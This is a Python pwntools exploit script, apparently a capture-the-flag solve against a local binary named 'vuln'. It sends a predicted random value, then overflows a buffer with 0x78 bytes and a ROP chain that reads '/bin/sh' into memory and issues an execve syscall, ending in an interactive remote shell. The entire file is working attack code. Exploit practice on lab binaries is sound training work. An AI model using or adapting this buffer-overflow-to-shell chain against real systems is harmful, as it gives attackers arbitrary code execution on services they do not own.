#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
rop = ROP(binary)

params = (binary.bss(), 0x10, u64(binary.read(binary.symbols["_IO_stdin"], 8)))
rop.call(binary.symbols["fgets"], params)
rop(rax=59, rdi=binary.bss(), rsi=0, rdx=0)
rop.raw(rop.syscall.address)
print(rop.dump())
print(rop.chain())

# Result of random with seed 0 then plus 1
io.sendline(b"84")

io.sendline(b"A" * 0x78 + rop.chain())
io.sendline(b"/bin/sh\x00")

io.interactive()
